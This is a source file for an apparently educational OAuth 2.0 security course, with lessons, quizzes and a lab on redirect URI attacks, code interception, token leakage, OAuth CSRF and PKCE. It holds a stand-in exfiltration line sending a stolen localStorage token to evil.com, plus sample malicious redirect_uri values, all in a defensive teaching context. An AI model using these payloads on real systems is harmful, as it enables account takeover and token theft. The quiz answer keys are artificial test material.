import type { Module } from "../../types";

export const oauthSecurity: Module = {
  id: "oauth-security",
  title: "OAuth 2.0 Security",
  description:
    "Master OAuth 2.0 attack vectors including redirect URI manipulation, authorization code interception, token leakage, and learn PKCE defense patterns.",
  difficulty: "Advanced",
  xpReward: 450,
  locked: false,
  lessons: [
    {
      id: "oauth-intro",
      title: "OAuth 2.0 Attack Surface",
      type: "theory",
      content: `# OAuth 2.0 Attack Surface

OAuth 2.0 is the industry standard for authorization, powering "Login with Google/GitHub/Facebook" flows everywhere. But its complexity creates numerous attack opportunities.

## Why OAuth Security Matters

- **OAuth is everywhere** - Most modern apps use OAuth for social login or API access
- **High-value target** - Compromising OAuth means full account takeover
- **Complex flows** - Multiple parties and redirects create attack surface

## OAuth 2.0 Flow Refresher

\`\`\`mermaid
sequenceDiagram
    participant User
    participant App as Client App
    participant Auth as Auth Server
    participant API as Resource Server

    User->>App: 1. Click "Login with Google"
    App->>Auth: 2. Redirect to authorization endpoint
    Auth->>User: 3. Show login/consent screen
    User->>Auth: 4. Approve access
    Auth->>App: 5. Redirect with authorization code
    App->>Auth: 6. Exchange code for tokens
    Auth->>App: 7. Return access_token + refresh_token
    App->>API: 8. API requests with access_token
\`\`\`

## Attack Vectors We'll Cover

### 1. Redirect URI Manipulation
Hijacking the authorization code by manipulating where it's sent.

### 2. Authorization Code Interception
Stealing the code from URLs, logs, or referrer headers.

### 3. Token Leakage
Access tokens exposed via browser history, referrer headers, or logs.

### 4. OAuth CSRF
Forcing users to link attacker-controlled accounts.

### 5. Implicit Flow Risks
Why the implicit flow is deprecated and dangerous.

## Real-World Impact

**Case: Slack Account Takeover (2020)**
A redirect URI vulnerability allowed attackers to steal authorization codes and take over any Slack workspace.

**Case: Facebook OAuth Bypass (2019)**
Researchers discovered token leakage via third-party JavaScript, earning $55,000 bounty.

## Key Insight

OAuth vulnerabilities often arise from **implementation mistakes**, not protocol flaws. The protocol is secure when implemented correctly—but that's harder than it sounds.`,
    },
    {
      id: "oauth-redirect-uri",
      title: "Redirect URI Manipulation",
      type: "theory",
      content: `# Redirect URI Manipulation

The redirect URI is where the authorization server sends the authorization code. If an attacker can control this, they receive the code instead of the legitimate app.

## The Attack

\`\`\`mermaid
sequenceDiagram
    participant Victim
    participant Attacker
    participant Auth as Auth Server
    participant Evil as Attacker's Server

    Attacker->>Victim: 1. Sends malicious link
    Note over Attacker,Victim: Crafted with modified redirect_uri
    Victim->>Auth: 2. Clicks link, authenticates
    Auth->>Evil: 3. Redirects with code to attacker!
    Evil->>Attacker: 4. Attacker has victim's code
    Attacker->>Auth: 5. Exchanges code for tokens
    Note over Attacker: Full account access!
\`\`\`

## Vulnerable Patterns

### 1. Open Redirects
\`\`\`
# Legitimate
redirect_uri=https://app.com/callback

# Attack: Open redirect on legitimate domain
redirect_uri=https://app.com/redirect?url=https://evil.com
\`\`\`

### 2. Subdomain Matching
\`\`\`
# If auth server allows *.app.com
redirect_uri=https://evil.app.com/callback

# Attacker registers evil.app.com subdomain
\`\`\`

### 3. Path Traversal
\`\`\`
# Registered: https://app.com/oauth/callback
# Attack attempt:
redirect_uri=https://app.com/oauth/callback/../../../evil
\`\`\`

### 4. Parameter Pollution
\`\`\`
# Some servers take the last value
?redirect_uri=https://app.com/callback&redirect_uri=https://evil.com
\`\`\`

## Defense: Exact Match Validation

\`\`\`javascript
// VULNERABLE: Partial matching
function validateRedirectUri(uri, registered) {
  return uri.startsWith(registered); // Allows app.com.evil.com!
}

// SECURE: Exact match only
function validateRedirectUri(uri, registeredUris) {
  return registeredUris.includes(uri); // Exact match
}
\`\`\`

## Defense Checklist

1. **Exact URI matching** - No wildcards, no partial matches
2. **No open redirects** - Audit your entire app for redirect vulnerabilities
3. **HTTPS only** - Never allow HTTP redirect URIs in production
4. **Pre-register all URIs** - Dynamic redirect URIs are dangerous
5. **Use PKCE** - Binds the code to the original client (covered later)`,
    },
    {
      id: "oauth-quiz-redirect",
      title: "Redirect URI Attack Quiz",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "An OAuth client registers 'https://app.com/callback' as their redirect URI. The auth server validates using startsWith(). Which attack URI would bypass this validation?",
        options: [
          "https://evil.com/app.com/callback",
          "https://app.com.evil.com/callback",
          "https://app.com/callback/../evil",
          "https://APP.COM/callback",
        ],
        correctAnswer: 1,
        explanation:
          "https://app.com.evil.com/callback passes startsWith('https://app.com') validation because the string begins with the registered URI. But app.com.evil.com is a completely different domain controlled by the attacker! This is why exact-match validation is critical.",
      },
    },
    {
      id: "oauth-code-interception",
      title: "Authorization Code Interception",
      type: "theory",
      content: `# Authorization Code Interception

Even with valid redirect URIs, authorization codes can leak through various channels.

## Leakage Vectors

### 1. Referrer Header Leakage

When the callback page loads external resources, the URL (with code) leaks via Referer header:

\`\`\`
# User lands on: https://app.com/callback?code=SECRET123

# Page loads external script:
<script src="https://analytics.com/track.js">

# Analytics server receives:
Referer: https://app.com/callback?code=SECRET123
\`\`\`

**Defense:**
\`\`\`html
<meta name="referrer" content="no-referrer">
<!-- Or in response header -->
Referrer-Policy: no-referrer
\`\`\`

### 2. Browser History

Authorization codes in URLs are stored in browser history:

\`\`\`
# User's browser history shows:
https://app.com/callback?code=abc123
https://app.com/callback?code=def456
https://app.com/callback?code=ghi789
\`\`\`

Shared computers or browser sync = exposed codes.

**Defense:** Immediately redirect after consuming the code:
\`\`\`javascript
// Callback handler
const code = url.searchParams.get('code');
await exchangeCodeForTokens(code);
// Replace URL to remove code from history
window.history.replaceState({}, '', '/dashboard');
\`\`\`

### 3. Server Logs

Codes in query parameters appear in access logs:

\`\`\`
192.168.1.1 - - [10/Mar/2024] "GET /callback?code=SECRET HTTP/1.1" 200
\`\`\`

**Defense:** Use POST for token exchange, minimize logging of auth endpoints.

### 4. Copy-Paste Attacks

Users sharing "callback" URLs for debugging unknowingly share valid codes:
\`\`\`
"I'm getting an error on this page: https://app.com/callback?code=abc123"
\`\`\`

**Defense:** Short code expiration (30-60 seconds).

## Code Properties for Security

\`\`\`javascript
// Secure authorization code settings
{
  length: 32,           // Minimum 128 bits of entropy
  expiration: 60,       // Seconds - short lived
  singleUse: true,      // Can only be exchanged once
  boundToClient: true,  // Only works with original client_id
  boundToRedirect: true // Only works with original redirect_uri
}
\`\`\`

## The PKCE Solution

PKCE (Proof Key for Code Exchange) binds the code to the original request, making interception useless:

\`\`\`
# Attacker intercepts code
# But can't exchange it without the code_verifier
# Which never left the legitimate client!
\`\`\`

We'll cover PKCE in detail in the next lesson.`,
    },
    {
      id: "oauth-pkce",
      title: "PKCE: The Modern Defense",
      type: "theory",
      content: `# PKCE: Proof Key for Code Exchange

PKCE (pronounced "pixy") is the modern solution to authorization code interception. Originally designed for mobile apps, it's now recommended for ALL OAuth clients.

## How PKCE Works

\`\`\`mermaid
sequenceDiagram
    participant Client
    participant Auth as Auth Server

    Note over Client: Generate random code_verifier
    Note over Client: code_challenge = SHA256(code_verifier)

    Client->>Auth: 1. Authorization request + code_challenge
    Auth->>Client: 2. Returns authorization code

    Note over Client: Attacker intercepts code here!

    Client->>Auth: 3. Token request + code + code_verifier
    Note over Auth: Verify: SHA256(code_verifier) == stored challenge
    Auth->>Client: 4. Returns tokens (only if verifier matches!)

    Note over Client: Attacker can't complete step 3
    Note over Client: They don't have code_verifier!
\`\`\`

## Implementation

### Step 1: Generate Code Verifier and Challenge

\`\`\`javascript
// Generate cryptographically random verifier
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64UrlEncode(array);
}

// Create challenge from verifier
async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64UrlEncode(new Uint8Array(hash));
}

// Base64 URL encoding (no padding, URL-safe chars)
function base64UrlEncode(buffer) {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\\+/g, '-')
    .replace(/\\//g, '_')
    .replace(/=+$/, '');
}
\`\`\`

### Step 2: Authorization Request

\`\`\`javascript
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);

// Store verifier securely (sessionStorage, not localStorage)
sessionStorage.setItem('pkce_verifier', codeVerifier);

// Build authorization URL
const authUrl = new URL('https://auth.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'your-client-id');
authUrl.searchParams.set('redirect_uri', 'https://app.com/callback');
authUrl.searchParams.set('scope', 'openid profile email');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
authUrl.searchParams.set('state', generateRandomState()); // CSRF protection

window.location.href = authUrl.toString();
\`\`\`

### Step 3: Token Exchange

\`\`\`javascript
// On callback page
const code = new URL(window.location).searchParams.get('code');
const codeVerifier = sessionStorage.getItem('pkce_verifier');

const response = await fetch('https://auth.example.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: 'https://app.com/callback',
    client_id: 'your-client-id',
    code_verifier: codeVerifier  // Proves we started the flow
  })
});

// Clean up
sessionStorage.removeItem('pkce_verifier');
\`\`\`

## Why PKCE Defeats Interception

| Without PKCE | With PKCE |
|--------------|-----------|
| Attacker intercepts code | Attacker intercepts code |
| Attacker exchanges code for tokens | Attacker tries to exchange code |
| **Attack succeeds** | Auth server requires code_verifier |
| | Attacker doesn't have it |
| | **Attack fails** |

## PKCE is Now Required

- **RFC 7636** defines PKCE
- **OAuth 2.1** requires PKCE for all clients
- Major providers (Google, Microsoft, Auth0) support it
- No reason not to use it`,
    },
    {
      id: "oauth-quiz-pkce",
      title: "PKCE Understanding Quiz",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "An attacker intercepts an authorization code from a PKCE-protected OAuth flow. Why can't they exchange this code for tokens?",
        options: [
          "The code is encrypted with the client's public key",
          "PKCE codes expire in 5 seconds",
          "They don't have the code_verifier that was generated client-side",
          "The authorization server blocks requests from unknown IP addresses",
        ],
        correctAnswer: 2,
        explanation:
          "PKCE binds the authorization code to a random code_verifier generated by the client. To exchange the code, you must provide the original code_verifier. Since this value never leaves the client (only its SHA256 hash is sent initially), an attacker who intercepts the code cannot complete the exchange.",
      },
    },
    {
      id: "oauth-csrf",
      title: "OAuth CSRF Attacks",
      type: "theory",
      content: `# OAuth CSRF Attacks

OAuth CSRF is different from traditional CSRF. Instead of performing actions, it forces victims to link their account to an attacker-controlled identity.

## The Attack: Forced Account Linking

\`\`\`mermaid
sequenceDiagram
    participant Attacker
    participant Victim
    participant App
    participant Auth as Auth Server

    Attacker->>Auth: 1. Start OAuth flow
    Auth->>Attacker: 2. Redirect with code (attacker's account)
    Attacker->>Attacker: 3. DON'T complete flow, save URL

    Note over Attacker: Malicious URL ready:
    Note over Attacker: app.com/callback?code=ATTACKER_CODE

    Attacker->>Victim: 4. Send link (email, forum, etc.)
    Victim->>App: 5. Clicks link (logged into App)
    App->>Auth: 6. Exchanges code (thinks it's Victim's)
    Auth->>App: 7. Returns Attacker's tokens
    App->>App: 8. Links Attacker's OAuth to Victim's account!

    Note over Attacker: Attacker can now login
    Note over Attacker: to Victim's account via OAuth!
\`\`\`

## Real-World Impact

**Scenario: Social Login Hijacking**

1. Victim has account on app.com (email: victim@email.com)
2. Attacker creates fresh Google account (attacker@gmail.com)
3. Attacker starts "Link Google Account" flow on app.com
4. Attacker sends callback URL to victim
5. Victim clicks while logged into their app.com account
6. Attacker's Google account is now linked to victim's app.com account
7. Attacker logs in via "Login with Google" → accesses victim's account

## The State Parameter Defense

The \`state\` parameter binds the OAuth request to the user's session:

\`\`\`javascript
// Starting OAuth flow
function startOAuthFlow() {
  // Generate unpredictable state
  const state = crypto.randomUUID();

  // Store in session (tied to this user)
  sessionStorage.setItem('oauth_state', state);

  const authUrl = new URL('https://auth.example.com/authorize');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', 'your-client-id');
  authUrl.searchParams.set('redirect_uri', 'https://app.com/callback');
  authUrl.searchParams.set('state', state); // Include state

  window.location.href = authUrl.toString();
}

// Callback handler
function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const returnedState = params.get('state');
  const savedState = sessionStorage.getItem('oauth_state');

  // CRITICAL: Verify state matches
  if (returnedState !== savedState) {
    throw new Error('State mismatch - possible CSRF attack!');
  }

  // State matches, safe to proceed
  const code = params.get('code');
  exchangeCodeForTokens(code);
}
\`\`\`

## State Parameter Requirements

| Requirement | Reason |
|-------------|--------|
| Unpredictable | Attacker can't guess valid state |
| Tied to session | Different users have different states |
| Single use | Can't replay old state values |
| Validated server-side | Client-side only isn't enough |

## Common Mistakes

### 1. Static State
\`\`\`javascript
// WRONG: Same state for everyone
const state = 'my-app-state';
\`\`\`

### 2. Predictable State
\`\`\`javascript
// WRONG: Attacker can predict
const state = 'user-' + userId;
\`\`\`

### 3. Missing Validation
\`\`\`javascript
// WRONG: Ignoring state on callback
const code = params.get('code');
exchangeCodeForTokens(code); // No state check!
\`\`\`

## Defense Checklist

1. ✅ Generate cryptographically random state
2. ✅ Store state in session before redirect
3. ✅ Include state in authorization request
4. ✅ Validate state on callback (exact match)
5. ✅ Delete state after validation (single use)`,
    },
    {
      id: "oauth-quiz-csrf",
      title: "OAuth CSRF Quiz",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "An app implements OAuth login but doesn't use the state parameter. What attack becomes possible?",
        options: [
          "Attacker can steal the user's access token",
          "Attacker can link their OAuth identity to victim's account",
          "Attacker can bypass the consent screen",
          "Attacker can modify the app's OAuth client credentials",
        ],
        correctAnswer: 1,
        explanation:
          "Without the state parameter, an attacker can perform OAuth CSRF: start an OAuth flow themselves, capture the callback URL with their authorization code, and trick a victim into visiting it. The victim's account gets linked to the attacker's OAuth identity, allowing the attacker to log in as the victim.",
      },
    },
    {
      id: "oauth-token-leakage",
      title: "Token Leakage Vectors",
      type: "theory",
      content: `# Token Leakage Vectors

Access tokens are bearer tokens - whoever has them can use them. Preventing leakage is critical.

## Leakage Vectors

### 1. URL Fragment Leakage (Implicit Flow)

The deprecated implicit flow returns tokens in URL fragments:

\`\`\`
https://app.com/callback#access_token=SECRET&token_type=bearer
\`\`\`

**Problems:**
- Fragments appear in browser history
- Leaked via Referer header in some browsers
- Accessible to JavaScript (including malicious scripts)

**Solution:** Don't use implicit flow. Use authorization code + PKCE instead.

### 2. localStorage Theft

\`\`\`javascript
// If ANY script on your page is compromised...
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal?token=' + token);
\`\`\`

XSS = complete token theft.

**Solution:** Use httpOnly cookies or store tokens in memory only:

\`\`\`javascript
// Tokens in memory (lost on page refresh, but secure)
let accessToken = null;

async function login() {
  const response = await exchangeCodeForTokens(code);
  accessToken = response.access_token; // Memory only
}

// Or: Backend-for-Frontend pattern
// Server stores tokens, issues httpOnly session cookie
\`\`\`

### 3. Referrer Header

External links leak the current URL:

\`\`\`html
<!-- User clicks this while on a page with token in URL -->
<a href="https://external-site.com">Click here</a>

<!-- External site receives: -->
Referer: https://app.com/page#access_token=SECRET
\`\`\`

**Solution:**
\`\`\`html
<meta name="referrer" content="no-referrer">
<!-- Or for specific links -->
<a href="..." rel="noreferrer">Link</a>
\`\`\`

### 4. Logging

\`\`\`javascript
// Accidentally logging tokens
console.log('API request:', { url, headers });
// Output: headers: { Authorization: "Bearer SECRET_TOKEN" }

// Or server-side
logger.info(\`Request: \${req.url}\`);
// If token is in URL: exposed in logs
\`\`\`

**Solution:** Sanitize logs, never pass tokens in URLs.

### 5. Third-Party Scripts

\`\`\`html
<!-- Ad network script -->
<script src="https://ads.example.com/script.js"></script>

<!-- Analytics -->
<script src="https://analytics.example.com/track.js"></script>

<!-- Any of these can access localStorage, cookies (non-httpOnly) -->
\`\`\`

**Solution:**
- Use httpOnly cookies
- Subresource Integrity (SRI)
- Content Security Policy (CSP)

## Secure Token Storage by Platform

| Platform | Recommended | Avoid |
|----------|-------------|-------|
| Web SPA | httpOnly cookie / memory | localStorage |
| React Native | SecureStore / Keychain | AsyncStorage |
| iOS | Keychain | UserDefaults |
| Android | EncryptedSharedPreferences | SharedPreferences |
| Server | Environment variables | Code/config files |

## The BFF Pattern (Backend-for-Frontend)

Best practice for SPAs - server handles tokens:

\`\`\`
┌─────────┐         ┌─────────┐         ┌───────────┐
│   SPA   │◄───────►│   BFF   │◄───────►│ Auth/API  │
│(Browser)│ Session │(Server) │  Tokens │  Servers  │
└─────────┘ Cookie  └─────────┘         └───────────┘
            httpOnly

- SPA never sees tokens
- BFF manages token lifecycle
- Session cookie is httpOnly (immune to XSS)
\`\`\``,
    },
    {
      id: "oauth-implicit-flow",
      title: "Implicit Flow Deprecation",
      type: "theory",
      content: `# Why Implicit Flow is Deprecated

The implicit flow was designed for JavaScript apps before CORS was widespread. It's now considered insecure and deprecated in OAuth 2.1.

## Implicit Flow Problems

### 1. Tokens in URL Fragments

\`\`\`
# Implicit flow callback
https://app.com/callback#access_token=eyJhbG...&token_type=bearer
\`\`\`

**Security issues:**
- Browser history stores the URL
- Referrer header can leak it
- Any JavaScript can read \`window.location.hash\`

### 2. No PKCE Protection

Implicit flow returns tokens directly - there's no authorization code to protect with PKCE.

### 3. No Refresh Tokens

Implicit flow can't issue refresh tokens (they'd be exposed in the browser). Result:
- Users must re-authenticate frequently
- Or: long-lived access tokens (security risk)

### 4. Token Injection Attacks

Without a server-side exchange, it's hard to validate token origin:

\`\`\`javascript
// Attacker crafts URL with stolen/forged token
https://app.com/callback#access_token=ATTACKER_TOKEN

// Victim clicks link
// App accepts the token without verification
// Attacker controls victim's session
\`\`\`

## Migration Path

### Old: Implicit Flow
\`\`\`
Client ──► Auth Server ──► Client (token in fragment)
                              ↓
                          Token exposed!
\`\`\`

### New: Authorization Code + PKCE
\`\`\`
Client ──► Auth Server ──► Client (code in query)
                              ↓
Client ──► Auth Server ──► Client (token via POST)
              ↑
         code_verifier
         (proof of origin)
\`\`\`

## Code Comparison

### Before (Implicit - Don't Use)
\`\`\`javascript
// Authorization request
const authUrl = 'https://auth.example.com/authorize?' +
  'response_type=token' +  // Returns token directly
  'client_id=xxx&' +
  'redirect_uri=https://app.com/callback';

// Callback - token in URL fragment
const hash = window.location.hash;
const token = new URLSearchParams(hash.slice(1)).get('access_token');
\`\`\`

### After (Authorization Code + PKCE)
\`\`\`javascript
// Authorization request
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);
sessionStorage.setItem('pkce_verifier', codeVerifier);

const authUrl = 'https://auth.example.com/authorize?' +
  'response_type=code' +  // Returns code, not token
  'client_id=xxx&' +
  'redirect_uri=https://app.com/callback&' +
  'code_challenge=' + codeChallenge + '&' +
  'code_challenge_method=S256';

// Callback - exchange code for token (server-side or with PKCE)
const code = new URLSearchParams(location.search).get('code');
const verifier = sessionStorage.getItem('pkce_verifier');

const response = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: 'https://app.com/callback',
    client_id: 'xxx',
    code_verifier: verifier
  })
});

const { access_token, refresh_token } = await response.json();
\`\`\`

## OAuth 2.1 Changes

OAuth 2.1 (draft) formally deprecates:
- ❌ Implicit flow (\`response_type=token\`)
- ❌ Resource Owner Password Credentials flow
- ❌ Authorization code without PKCE

**Required in 2.1:**
- ✅ PKCE for all clients (public and confidential)
- ✅ Exact redirect URI matching
- ✅ Refresh token rotation`,
    },
    {
      id: "oauth-lab",
      title: "Lab: Secure OAuth Implementation",
      type: "lab",
      content: `# Lab: Secure OAuth Client

Fix this vulnerable OAuth implementation to use PKCE and state parameter.

## Vulnerable Code

The code below starts an OAuth flow without PKCE or CSRF protection.

## Your Task

1. Generate a cryptographic \`state\` parameter for CSRF protection
2. Generate PKCE \`code_verifier\` and \`code_challenge\`
3. Include both in the authorization URL
4. Store verifier and state in sessionStorage

## Requirements

Your solution must:
- Generate random state using \`crypto.randomUUID()\`
- Generate code_verifier using \`crypto.getRandomValues()\`
- Create code_challenge using SHA-256 hash
- Store both state and verifier in sessionStorage
- Include \`code_challenge_method=S256\` in the URL`,
      lab: {
        initialCode: `async function startOAuthLogin() {
  // VULNERABLE: No CSRF protection, no PKCE
  const authUrl = new URL('https://auth.example.com/authorize');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', 'my-app');
  authUrl.searchParams.set('redirect_uri', 'https://app.com/callback');
  authUrl.searchParams.set('scope', 'openid profile');

  // Missing: state parameter
  // Missing: PKCE code_challenge

  window.location.href = authUrl.toString();
}`,
        solutionCode: `async function startOAuthLogin() {
  // Generate CSRF protection
  const state = crypto.randomUUID();
  sessionStorage.setItem('oauth_state', state);

  // Generate PKCE verifier (43-128 chars of URL-safe random)
  const verifierBytes = new Uint8Array(32);
  crypto.getRandomValues(verifierBytes);
  const codeVerifier = btoa(String.fromCharCode(...verifierBytes))
    .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');
  sessionStorage.setItem('pkce_verifier', codeVerifier);

  // Create code challenge (SHA-256 of verifier)
  const encoder = new TextEncoder();
  const data = encoder.encode(codeVerifier);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(hashBuffer)))
    .replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');

  const authUrl = new URL('https://auth.example.com/authorize');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('client_id', 'my-app');
  authUrl.searchParams.set('redirect_uri', 'https://app.com/callback');
  authUrl.searchParams.set('scope', 'openid profile');
  authUrl.searchParams.set('state', state);
  authUrl.searchParams.set('code_challenge', codeChallenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');

  window.location.href = authUrl.toString();
}`,
        instructions:
          "Fix the OAuth flow: 1) Add state parameter using crypto.randomUUID(), 2) Generate PKCE code_verifier with crypto.getRandomValues(), 3) Create SHA-256 code_challenge, 4) Store state and verifier in sessionStorage, 5) Add code_challenge and code_challenge_method to URL.",
      },
    },
    {
      id: "oauth-final-quiz",
      title: "OAuth Security Final Assessment",
      type: "quiz",
      content: "",
      quiz: {
        question:
          "A web app stores OAuth access tokens in localStorage. An attacker finds an XSS vulnerability in the app. What can they do?",
        options: [
          "Nothing - localStorage is protected by the browser's same-origin policy",
          "Steal the refresh token only, not the access token",
          "Read the access token and use it from their own machine",
          "Only view the token but not exfiltrate it due to CSP",
        ],
        correctAnswer: 2,
        explanation:
          "XSS gives the attacker full JavaScript access within the page's origin. Since localStorage is accessible to any script on that origin, the attacker can read the access token and send it to their server. They can then use this token from anywhere. This is why httpOnly cookies or the BFF pattern are recommended - they're immune to JavaScript access.",
      },
    },
  ],
};
